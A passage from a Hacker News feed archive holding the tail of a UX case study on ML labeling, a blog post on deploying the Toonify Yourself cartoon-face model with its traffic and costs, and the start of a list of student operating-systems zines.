Success in this context is important to talk about since their status quo process is just a means to that end.]</p></li><li><p>What is your title, and responsibilities? [<em>Why?</em> To see if there are any correlations amongst such demographic data and insights found unique to each interview.]</p></li></ol><h3>Initial Sketches</h3><p>Based on watching these users show me their process and express their motivations I started sketching all of my ideas on how it could be better done within the confounds of a web application. It was particularly important to get these ideas out of my mind before moving on to the next step, where for the first time I look at the user’s current design and user flow. These designs were never sent to the client, they were for me to reference at a later point (hence the rough presentation).</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600290170084_26906"><div><h2>UX Audit</h2><p>I have written extensively about my UX Audit process on this third party <a href="https://www.toptal.com/designers/ux/guide-to-ux-analysis"><span>blog</span></a>, so I won’t get into too many details in this post.&nbsp;</p><p>Since the problem was identified as user retention and engagement, without which the ML will be completely useless, I focused on a new user’s experience uploading their first resume, making corrections and downloading the ML output in the form of a reformatted resume (the happy path).</p><p>I approached it as if I was doing a user test on myself and annotated all of the parts of the process, considering important UX heuristics.</p><p>Here is a small set of the issues I pointed out in the UX audit:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600290170084_32288"><div><h2>Redesign</h2><p>By going through the process as it was originally designed, I found myself constantly running into the question of “What do I do next?”. To fix this problem, part of the redesign required improving the user onboarding and navigation structure by fixing the visual hierarchy and limiting the choices the user has. A great analogy for this part is Turbotax. Step-by-step, drawing attention to things displayed when the user needs them. As a part of this, I proposed a very simple 3 step process: Upload &gt; Edit Labels &gt; Preview and download.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600290170084_36671"><div><h3>Machine Learning UX</h3><p>The important part of designing a way for the users to correct ML output, and label data from scratch, is designing for the edge cases and finding a happy medium. After speaking with the team’s deep learning AI specialist (the ML guy), I identified the following to design for:</p><p>-ML model labels nothing and the user needs to label everything</p><p>-ML model labels a few things and the user needs to label everything else</p><p>-ML model labels everything and the user needs to check them and make corrections</p><p>As a part of my newly proposed 3 step navigation structure, this would all be in the Edit Labels section. As a part of this section, a great analogy to communicate my thinking process was Duolingo’s interface. After a user creates their first label, gamification and positive reinforcement would be extremely important to encourage the user to create subsequent labels. </p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600290170084_41202"><div><p>As a part of it, a user should not be able to see a rough bare-bones template output (as was the case in the designs at the time) and instead, would need to label a certain amount before ‘unlocking’ a more satisfying, complete looking output. Of course, as time went on and the ML model got better, they would automatically see good outputs. But in order to get there, the designs must first incentivize users to make labels.</p><p>I identified that the mechanism of the ML labeling interface would need to communicate the following:</p><p>-what things were labelled by ML&nbsp;</p><p>-what to label (I.E. first name)</p><p>-how to label something</p><p>-how to correct a label (I.E. last name was labelled as first name)</p><p>-how to correct the highlighted text (I.E. Arvand Alviri is labelled as first name, but the user should be able to change the highlight to be only Arvand, instead of removing the label and re-highlighting it from scratch)</p><p>-how to remove a label</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600290170084_45764"><div><h3>Final Steps: User Analytics to Correct Machine Learning Models</h3><p>For the final steps, I gave the client a user analytics tracking plan, that would help them make future product decisions, as well as gather extra data for the ML model. Things that I suggested they track in their user analytics tool included:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1600290170084_50169"><div><p>As an example, these two would help identify which labels are most commonly missed by the ML, and which are most commonly mislabeled by the ML.&nbsp;</p><p>Other user analytics events that focused on user retention and engagement over the overall product as well. </p></div></div></div>]]>
            </description>
            <link>https://www.cakewalklabs.com/blog/2020/9/16/ux-to-entice-users-to-train-saas-machine-learning-model-case-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-24548458</guid>
            <pubDate>Mon, 21 Sep 2020 21:04:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making Toonify Yourself]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24548398">thread link</a>) | @amrrs
<br/>
September 21, 2020 | https://www.justinpinkney.com/making-toonify/ | <a href="https://web.archive.org/web/*/https://www.justinpinkney.com/making-toonify/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>Last touched <!-- -->September 20, 2020</p></header><p>So <a href="https://linktr.ee/Norod78">Doron Adler</a> and I recently released our toonification translation model at our Toonify Yourself website. It turned out to be pretty popular with tens of thousands people visiting in the 22 hours it was running for, submitting almost a quarter of a million images for toonification.</p><p>It got quite a bit of interest on social media, and picked up on a few websites. Unfortunately we had to turn off the toonification server before costs started to get out of hand, but we’re working on bringing it back so people can carry on playing with the model for free.</p><p>A lot of people have expressed interest in how the model work and how the website was run. So here’s a blog post with some details on the traffic and running costs, as well as the technical details of how to run a deep neural network in the cloud serving tens of thousands of requests an hour!</p><h2>Making an efficient Toonification model</h2><p><strong>If you want to know about the details of the original Toonification model, see <a href="https://www.justinpinkney.com/toonify-yourself">this blog post</a>.</strong></p><p>The original Toonification method involved an expensive optimisation process to encode a person’s face using the blended StyleGAN model which can take several minutes to run even on a GPU. Clearly this wasn’t going to cut it as a web app! A common pattern in deep learning is replacing expensive optimisations with more neural networks<sup id="fnref-style-transfer"><a href="#fn-style-transfer">style-transfer</a></sup>. We used the basic idea described in <em>StyleGAN2 Distillation for Feed-Forward Image Manipulation</em><sup id="fnref-distillation"><a href="#fn-distillation">distillation</a></sup>, i.e. training a pix2pixHD model to apply the transformation to any arbitrary image, rather than first having to perform the optimisation step.</p><figure>
    <span>
      <a href="https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/ac99c/allen.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Left: Original, Middle: Optimised, Right: pix2pixHD" title="Left: Original, Middle: Optimised, Right: pix2pixHD" src="https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/4b190/allen.jpg" srcset="https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/e07e9/allen.jpg 200w,https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/066f9/allen.jpg 400w,https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/4b190/allen.jpg 800w,https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/e5166/allen.jpg 1200w,https://www.justinpinkney.com/static/50c2200f7eb48cc62f9160a7ed1bc1f9/ac99c/allen.jpg 1536w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span>
    <figcaption>Left: Original, Middle: Optimised, Right: pix2pixHD</figcaption>
  </figure><p>The novel part here is that the pairs of images we use for the training process are pairs produced by the original FFHQ model and the blended model<sup id="fnref-new-model"><a href="#fn-new-model">new-model</a></sup>. Although the pix2pixHD model is only trained on image generated by the two StyleGAN models, when it’s done we should be able to apply it to any image and get the same toonification result</p><figure>
    <span>
      <a href="https://www.justinpinkney.com/static/9c34e8bc63610a2c7e19ce896020a10c/ea522/monkwithbook.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="It even works on paintings!" title="It even works on paintings!" src="https://www.justinpinkney.com/static/9c34e8bc63610a2c7e19ce896020a10c/4b190/monkwithbook.jpg" srcset="https://www.justinpinkney.com/static/9c34e8bc63610a2c7e19ce896020a10c/e07e9/monkwithbook.jpg 200w,https://www.justinpinkney.com/static/9c34e8bc63610a2c7e19ce896020a10c/066f9/monkwithbook.jpg 400w,https://www.justinpinkney.com/static/9c34e8bc63610a2c7e19ce896020a10c/4b190/monkwithbook.jpg 800w,https://www.justinpinkney.com/static/9c34e8bc63610a2c7e19ce896020a10c/ea522/monkwithbook.jpg 1028w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span>
    <figcaption>It even works on paintings!</figcaption>
  </figure><h2>Deploying the model</h2><p>So after the initial interest on Twitter about my experiments putting together a local web app for myself to run the Toonify model I decided to take a crack at putting up a website where anybody could run it on their own images.</p><p>First things first I wasn’t going to be running anything on a GPU, so I needed to get the pix2pixHD model runnable on a CPU. The original pix2pixHD repo has some bugs which prevent inference without a GPU and I fixed these <a href="https://www.justinpinkney.com/making-toonify/github.com/justinpinkney/pix2pixHD/">on my fork</a> if anyone is interested. In the end I actually decided to export the model to ONNX format so I could run it using the ONNX runtime. This makes the dependencies more lightweight than trying to run using PyTorch and (I hope) the ONNX runtime is built with performance in mind.</p><p>I went for Google Cloud Run as a means of deploying the web app. All the thing needs to do is accept an image, run inference, and return the result. It’s totally stateless so a good fit for the Cloud Run model. The use of Docker containers in Cloud Run meant that it was easy for me to bundle up any required dependencies, scalability was built right in and there is a generous free allowance (not generous enough it would turn out!).</p><p>So after a few evenings of putting together a small app using Flask and Bootstrap, things were ready to deploy!</p><h2>Toonification in the Wild</h2><p>So after some beta testing with friends I announced the release of the <a href="https://toonify.justinpinkney.com/">Toonify Yourself</a> website on Twitter. It quickly got some reasonable traffic and people seemed to be enjoying trying the model out on themselves.</p><p><span>
      <a href="https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/d4e6b/toonify.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="toonify" title="toonify" src="https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/4b190/toonify.jpg" srcset="https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/e07e9/toonify.jpg 200w,https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/066f9/toonify.jpg 400w,https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/4b190/toonify.jpg 800w,https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/e5166/toonify.jpg 1200w,https://www.justinpinkney.com/static/13843ad21b00ceeaababb239f4b522b4/d4e6b/toonify.jpg 1278w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><p>Some were complaining that their faces were never detected no matter what they submitted, and I fairly quickly figured out (and many helpful people online started to point out) that it was an issue with image rotation on iPhones<sup id="fnref-transpose"><a href="#fn-transpose">transpose</a></sup>.</p><p>By the next morning traffic started to really pick up, partly due to getting on the front page of <a href="https://news.ycombinator.com/item?id=24494377">Hacker News</a>. I was starting to get a little bit twitchy seeing the number of containers spun up on Cloud Run steadily increasing. As lunch time approached we were getting close to 25,000 page views an hour, at times this was requiring 100 containers to service the traffic, and thing were going up fast.</p><p><span>
      <a href="https://www.justinpinkney.com/static/3efe054ef08381982f132d0d7dab26c7/8ae78/page-views.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="page views" title="page views" src="https://www.justinpinkney.com/static/3efe054ef08381982f132d0d7dab26c7/5a190/page-views.png" srcset="https://www.justinpinkney.com/static/3efe054ef08381982f132d0d7dab26c7/772e8/page-views.png 200w,https://www.justinpinkney.com/static/3efe054ef08381982f132d0d7dab26c7/e17e5/page-views.png 400w,https://www.justinpinkney.com/static/3efe054ef08381982f132d0d7dab26c7/5a190/page-views.png 800w,https://www.justinpinkney.com/static/3efe054ef08381982f132d0d7dab26c7/8ae78/page-views.png 1096w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><p>The measly number of free cpu and ram minutes had long since evaporated, and I was getting a little concerned about what the cloud bill was going to be after I came back from an afternoon out of the house. So rather than limit things to a level that most people would get a non-response from the site, I decided to turn off the model and switch to an apology message.</p><p><span>
      <a href="https://www.justinpinkney.com/static/725194636991c672e1077b6162c20df5/5112c/offline.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="offline" title="offline" src="https://www.justinpinkney.com/static/725194636991c672e1077b6162c20df5/4b190/offline.jpg" srcset="https://www.justinpinkney.com/static/725194636991c672e1077b6162c20df5/e07e9/offline.jpg 200w,https://www.justinpinkney.com/static/725194636991c672e1077b6162c20df5/066f9/offline.jpg 400w,https://www.justinpinkney.com/static/725194636991c672e1077b6162c20df5/4b190/offline.jpg 800w,https://www.justinpinkney.com/static/725194636991c672e1077b6162c20df5/5112c/offline.jpg 1149w" sizes="(max-width: 800px) 100vw, 800px" loading="lazy">
  </a>
    </span></p><h2>The numbers</h2><p>In the end we had close to a quarter of a million page views before I shut down the toonification. Not every one of these corresponds to someone submitting an image, but it’s not far off, and each user submitted around 3 or 4 images for toonification.</p><p>So how much did this all cost? Not quite as much as I thought, I had set a personal limit of spending around $100 on this and I didn’t break that. But here are some details of what it costs to run a service like this.</p><p>The model takes about 5 seconds to run inference on whatever hardware Cloud Run uses, and occupies around 1.4 GB of memory whilst doing it. It also takes a slightly astonishing 20 seconds to load the model the first time a container is brought up (and this happens more than I’d like), and the memory peaks at well over 2GB during this period. All this meant that processing a thousand images probably costs around 30 cents (footnote: there are also some other smaller costs like network egress to think about, but that’s not much extra), which isn’t too bad, but when you’re trying to process 25,000 an hour, starts to add up fast!</p><p>I’m still pretty amazed that it was so easy to build a site which could service so much traffic and do some serious image processing in the cloud. I’ve never used any of this scalable serverless technology before, but it was incredibly easy to get going!</p><h2>Feedback</h2><p>A lot of people commented that the images produced didn’t preserve enough of the original character of the person, that they ended up looking pretty generic, and that a human cartoonist could do a far better job. I fully agree, there is not way deep learning is going to outperform a skilled artist any time soon! But there is also no way you could get skilled human artists to make cartoon versions of people for 30 cents per thousand.</p><p>Despite me putting a line in the FAQ assuring people I was not storing or collecting their images (how on earth would I have afforded that!?) several people commented on it with scepticism, surely something free online must be harvesting your data somehow? But honestly once the toonification was done the original image and the result were gone forever (for me at least). Plus I don’t really see why people were worried, people have already happily uploaded millions of photos of themselves to the internet and social media sites, who explicitly do make money from your data. If companies want to collect face data, a silly website like mine is not the way to do it!</p><h2>The future</h2><p>We’re currently working on getting the website back up and running again. I’m not keen on the obvious (and suggested by many) strategy of just plastering ads everywhere. But the success of the website has sparked many interesting conversations for me, and I think one of them will lead to a solution pretty soon.</p><p><strong>So watch this space (or my Twitter feed) Toonify Yourself will be back!</strong></p><h2>Twitter</h2><p>Lots of people shared fun examples on Twitter, here are a few:</p><h2>Coverage</h2><p>Here are some links to the coverage this got.</p><ul><li><a href="https://www.pocket-lint.com/apps/news/153848-how-to-toonify-yourself-see-what-you-d-look-like-in-a-cartoon-movie">Pocket lint - How to Toonify yourself: See what you’d look like in a cartoon movie</a></li><li><a href="https://gigazine.net/gsc_news/en/20200917-toonify-yourself/">Gigazine - I tried using ‘Toonify Yourself!’ Which can convert your face into Disney animation style</a></li><li><a href="https://meduza.io/shapito/2020/09/17/meduza-ispytala-toonify-servis-kotoryy-prevraschaet-vas-v-personazhey-multfilmov-nu-ili-v-cheloveka-epohi-neolita">Meduza - Medusa tried Toonify, a service that turns you into cartoon characters. Well, or in a man of the Neolithic era</a></li><li><a href="https://youtu.be/7Oqpiaj0IUM">This AI Transform Faces into Hyper-Realistic Cartoon Characters</a></li><li><a href="https://tech.sina.com.cn/roll/2020-09-20/doc-iivhuipp5388256.shtml">The three giants of deep learning have also become cute, this one-click conversion of animated movie images is actually offline due to “too hot”</a></li></ul><p><strong>TODO</strong></p></article></div>]]>
            </description>
            <link>https://www.justinpinkney.com/making-toonify/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24548398</guid>
            <pubDate>Mon, 21 Sep 2020 20:58:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Operating systems zines made by CS students]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547746">thread link</a>) | @azhenley
<br/>
September 21, 2020 | https://nipunbatra.github.io/os2020/zine/ | <a href="https://web.archive.org/web/*/https://nipunbatra.github.io/os2020/zine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/booting.png" alt="">
    </p>
    <div>
      <h3><b>Booting</b></h3>
      <p>Arpit Patel &amp; Lovepreet Singh</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/booting.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1ecfxb93eQiO1A13lTeZ8tm6VHBX3zaaJ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CFS.png" alt="">
    </p>
    <div>
      <h3><b>Completely Fair Scheduler</b></h3>
      <p>Preet Patel &amp;  Ribhu Vajpeyi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CFS.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bNf4Bloj71m9fKkZoN5Ot1flXyvGUKgB/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Checksum.png" alt="">
    </p>
    <div>
      <h3><b>Checksum</b></h3>
      <p>Anupam Kumar &amp; Chiluveru Preeti</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Checksum.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/181N0FAGVofW3dBhQ6tQsuUcim0YpdtlW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/chmod.png" alt="">
    </p>
    <div>
      <h3><b>chmod</b></h3>
      <p>Pranshu Kumar Gond &amp; Sagar Bisen</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/chmod.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hPdjCsrAHTRImBf1kV4ACBW6W7_d-LQW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CODEC.png" alt="">
    </p>
    <div>
      <h3><b>CODEC</b></h3>
      <p>Utsav Jethva	&amp; Shweta Pardeshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CODEC.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hONumvnnPV0CgGxVfA_hHYALUTYW3z5M/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CRON.png" alt="">
    </p>
    <div>
      <h3><b>CRON</b></h3>
      <p>Chandrahas	Rama &amp; Krishna Reddy</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CRON.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1Z2CStAdJYa24N7Y5RMUe96QC-qzS9PuQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/cross_compilation.png" alt="">
    </p>
    <div>
      <h3><b>Cross Compilation</b></h3>
      <p>Urvishkumar Patel &amp; Tanmaey Gupta</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/cross_compilation.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bp6xTXdZ2ij53xyr7stgi6vtDwi9SKBE/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Curl.png" alt="">
    </p>
    <div>
      <h3><b>Curl</b></h3>
      <p>Akshay Biju &amp; Avinash Karanam</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Curl.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dUGubQh7Yicwlvc0egKprEb6mLeCjPFg/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/DD.png" alt="">
    </p>
    <div>
      <h3><b>Data Duplicator</b></h3>
      <p>Dhanya Sree &amp;  Manisha</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/DD.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/12Z3TS4XU4XJzAHtQN0UkEPN2pp0EMgJi/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Docker.png" alt="">
    </p>
    <div>
      <h3><b>Docker</b></h3>
      <p>Shivam Sahni &amp;  Dishank Goel</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Docker.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dEj3UBFZgRYY0sjoV1cTKbJeVYtuivsS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Dotfiles.png" alt="">
    </p>
    <div>
      <h3><b>Dotfiles</b></h3>
      <p>G Harshavardhan &amp;  Pittala Nikhil</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Dotfiles.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1f59tv18sSqNwara8oo2YVoT_3II4Ww5l/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.png" alt="">
    </p>
    <div>
      <h3><b>Environment Variable</b></h3>
      <p>Prasad Athave &amp;  Siddharth Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1iKiV5BTdzG7UKPnsVfD-c3utEig3KHgc/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/gdb.png" alt="">
    </p>
    <div>
      <h3><b>gdb</b></h3>
      <p>Dhruvi Lodhavia &amp;  Udit Vyas</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/gdb.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1APC_H_ogNgClvDlawFrSObP4dcSm_5Kf/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GREP.png" alt="">
    </p>
    <div>
      <h3><b>GREP</b></h3>
      <p>Priyam Tongia &amp;  Mihir Jain</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GREP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jgOq0CNteDyv9UwqmatrgtFyMzLfnKoY/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GZIP.png" alt="">
    </p>
    <div>
      <h3><b>GZIP</b></h3>
      <p>Kalyan  &amp;  Shahid</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GZIP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1uJ78nyH_btQ4q5DU9bFLjOADJPrFLj-9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.png" alt="">
    </p>
    <div>
      <h3><b>Make File</b></h3>
      <p>Kushagra Sharma  &amp;  Aditya Tripathi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1lHeeE7Ib0-2riTf3Y1m_zwtMkUDSQBwu/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/man.png" alt="">
    </p>
    <div>
      <h3><b>Man</b></h3>
      <p>Vedant Bhutani &amp;  Ojas Mithbavkar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/man.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1oY0gE0SyTdnBQ33XUhRqXk9Qow3K3h_9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Mount.png" alt="">
    </p>
    <div>
      <h3><b>Mount</b></h3>
      <p>Abhavya Chandra &amp;  Shubham Deshpande</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Mount.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/17qzY44lbL0CmD69Po7HnM1bFXUkvRAx-/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Nohup.png" alt="">
    </p>
    <div>
      <h3><b>Nohup</b></h3>
      <p>Aditya Pusalkar &amp;  Pushkar Mujumdar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Nohup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1BsOSQwzfo4Y-oqocBOPz1v5UT89wpSkH/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/nslookup.png" alt="">
    </p>
    <div>
      <h3><b>nslookup</b></h3>
      <p>Ajinkya Pawar &amp;  Jitender Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/nslookup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/19JlHAFJGVz515C6WyGOufZ0tQB_Kf1JU/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/OS_Python.png" alt="">
    </p>
    <div>
      <h3><b>OS Python</b></h3>
      <p>Amey Kulkarni &amp;  Chris Francis</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/OS_Python.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1gHbMbr064SxUK1aOY0k0MSjXrRrYLmRS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/peggit.png" alt="">
    </p>
    <div>
      <h3><b>Peggit</b></h3>
      <p>Janvi Thakkar &amp;  Aishna Agrawal</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/peggit.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jv3JHauQ-NFFxL1-z77bsg4bd9Ef_e14/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ping.png" alt="">
    </p>
    <div>
      <h3><b>Ping</b></h3>
      <p>Raghav Goyal &amp;  Devvrat Joshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ping.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1KTo_GnLo5Lk33j1vJRp99niGuG1dJsQv/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/pipe.png" alt="">
    </p>
    <div>
      <h3><b>Pipes</b></h3>
      <p>Harsh Shah &amp;  Madhav Tiwari</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/pipe.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SED.png" alt="">
    </p>
    <div>
      <h3><b>SED</b></h3>
      <p>Ronak Kaoshik &amp;  Deepika Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SED.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1wLoi0Fw0P2eN9pCjeGKjLOcQtNmfrGmI/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SFTP.png" alt="">
    </p>
    <div>
      <h3><b>SFTP</b></h3>
      <p>Viraj Shah &amp;  Vrutik Shah</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SFTP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1_vuoQw64f8qxhGwfkJhPRIL6FM9PFvX_/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.png" alt="">
    </p>
    <div>
      <h3><b>Sort and Uniq</b></h3>
      <p>Nishikant Parmar &amp;  Sachin Yadav</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1u_4qVfko5kEyhPOBp8iNWaVbtncoPhTO/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSDS.png" alt="">
    </p>
    <div>
      <h3><b>SSDS</b></h3>
      <p>Varun Jain &amp;  Arpita Kabra</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSDS.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSH.png" alt="">
    </p>
    <div>
      <h3><b>SSH</b></h3>
      <p>Harsh Patel &amp;  Palak Purohit</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSH.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1V1ou72qCVmTSSOmDJTJEPcyyLSF7F_2g/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/tar.png" alt="">
    </p>
    <div>
      <h3><b>Tar</b></h3>
      <p>Vivek Modi  &amp;  Shruti Katpara</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/tar.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1x-Mgglk0W2Xz3-NSwpEt74iZMGM045qh/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Traceroute.png" alt="">
    </p>
    <div>
      <h3><b>Traceroute</b></h3>
      <p>Rwik Rana &amp;  Harshit Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Traceroute.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/11mPNAKAXZHaBM_UoznSEZcW6TVH_osOl/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Valgrind.png" alt="">
    </p>
    <div>
      <h3><b>Valgrind</b></h3>
      <p>Abhinav Singh &amp;  Bikramjot Singh Dhindsa</p>
 
